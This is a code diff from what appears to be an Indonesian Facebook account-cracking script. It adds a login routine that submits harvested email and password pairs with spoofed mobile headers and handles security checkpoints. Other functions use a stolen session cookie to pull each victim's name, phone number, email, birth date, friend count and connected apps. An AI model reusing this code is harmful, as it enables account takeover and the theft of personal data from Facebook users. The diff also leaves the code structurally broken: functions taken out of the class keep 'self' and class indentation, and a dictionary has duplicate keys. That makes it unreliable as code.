@@ -513,9 +513,69 @@ def userset():
     else:print(f"{P}[•] Pilihan salah ");exit()
 
 #####LOGIN HASIL
-class log_hasil():
-	
-	def cek_opsi(self):
+def log_hasil(user, pasw):
+    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+    ses = requests.Session()
+    ses.headers.update({
+    "Host": "mbasic.facebook.com",
+    "cache-control": "max-age=0",
+    "upgrade-insecure-requests": "1",
+    "origin": host,
+    "content-type": "application/x-www-form-urlencoded",
+    "user-agent": ua,
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "x-requested-with": "mark.via.gp",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-user": "?1",
+    "sec-fetch-dest": "document",
+    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
+    "accept-encoding": "gzip, deflate",
+    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+    })
+    data = {}
+    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+    fm = ged.find("form",{"method":"post"})
+    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+    for i in fm.find_all("input"):
+        if i.get("name") in list:
+            data.update({i.get("name"):i.get("value")})
+        else:
+            continue
+    data.update({"email":user,"pass":pasw})
+    try:
+        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+    except requests.exceptions.TooManyRedirects:
+        print(f"{B} | ")
+        print(f"{M}[•] Akun terkena spam")
+    if "c_user" in ses.cookies:
+        print(f"{P}[•]{I} Akun berhasil di login")
+    elif "checkpoint" in ses.cookies:
+        form = run.find("form")
+        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+        jzst = form.find("input",{"name":"jazoest"})["value"]
+        nh   = form.find("input",{"name":"nh"})["value"]
+        dataD = {
+            "fb_dtsg": dtsg,
+            "fb_dtsg": dtsg,
+            "jazoest": jzst,
+            "jazoest": jzst,
+            "checkpoint_data":"",
+            "submit[Continue]":"Lanjutkan",
+            "nh": nh
+        }
+        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
+        ngew = [yy.text for yy in tempek.find_all("option")]
+        for opt in range(len(ngew)):
+            print(f"{B} | ")
+            jalan(f"{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
+    elif "login_error" in str(run):
+        oh = run.find("div",{"id":"login_error"}).find("div").text
+        print(f"{P}[•]{M}>>>> {oh}")
+    else:
+        print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
+        
+def cek_opsi(self):
 		global aman,cpsalah
 		session=req.Session()
 		session.headers.update({
@@ -596,7 +656,6 @@ class log_hasil():
 						print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
 					self.get_info(session,coki)
 					self.cek_apk(session,coki)
-					
 		else:
 			salah+=1
 			print(f"\r{M}[!] Kata sandi salah atau sudah diubah          {P}\n")
@@ -623,7 +682,7 @@ class log_hasil():
 				self.cek_apk(session,coki)
 			else:
 				print("")
-	def get_info(self,session,coki):
+def get_info(self,session,coki):
 		get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
 		nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
 		response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
@@ -650,7 +709,7 @@ class log_hasil():
 		except:
 			teman = ""
 		print(f"[{H}={P}] Nama: {K}{nama}{P}\n[{H}={P}] Tahun pembuatan: {K}{tahun}{P}\n[{H}={P}] Teman: {K}({teman}){P}\n[{H}={P}] Nomer-ponsel: {K}{nomer}{P}\n[{H}={P}] Email: {K}{email}{P}\n[{H}={P}] Tanggal-lahir: {K}{ttl}{P}")
-	def cek_apk(self,session,coki):
+def cek_apk(self,session,coki):
 		hit1, hit2 = 0,0
 		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
 		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
@@ -680,7 +739,6 @@ class log_hasil():
 		else:
 			print(f"[{BM}×{P}] {M}Cookies Invalid{P}")
 		print("")
-
 
 def cek_hasil():
     print(f"{B} | ")
